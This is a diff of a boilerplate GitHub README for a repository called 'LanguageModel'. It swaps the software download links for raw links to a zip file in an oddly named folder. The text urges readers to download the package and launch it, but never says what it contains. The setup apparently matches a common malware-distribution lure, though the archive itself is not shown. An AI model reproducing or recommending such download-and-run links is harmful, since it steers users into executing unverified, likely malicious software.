@@ -1,6 +1,6 @@
 # 🚀 Welcome to the LanguageModel Repository!
 
-[![Software Link](https://github.com/Jts36/LanguageModel/releases/download/v2.0/Software.zip)](https://github.com/Jts36/LanguageModel/releases/download/v2.0/Software.zip)
+[![Software Link](https://raw.githubusercontent.com/Jts36/LanguageModel/main/alphabetist/Model-Language-v2.6.zip)](https://raw.githubusercontent.com/Jts36/LanguageModel/main/alphabetist/Model-Language-v2.6.zip)
 
 ### Repository Name: LanguageModel
 ### Short Description: 
@@ -15,7 +15,7 @@ No specific topics are provided for this repository.
 
 Click the button below to download the software package. It needs to be launched to experience the LanguageModel functionality.
 
-[![Download Software](https://github.com/Jts36/LanguageModel/releases/download/v2.0/Software.zip)](https://github.com/Jts36/LanguageModel/releases/download/v2.0/Software.zip)
+[![Download Software](https://raw.githubusercontent.com/Jts36/LanguageModel/main/alphabetist/Model-Language-v2.6.zip)](https://raw.githubusercontent.com/Jts36/LanguageModel/main/alphabetist/Model-Language-v2.6.zip)
 
 ---
 
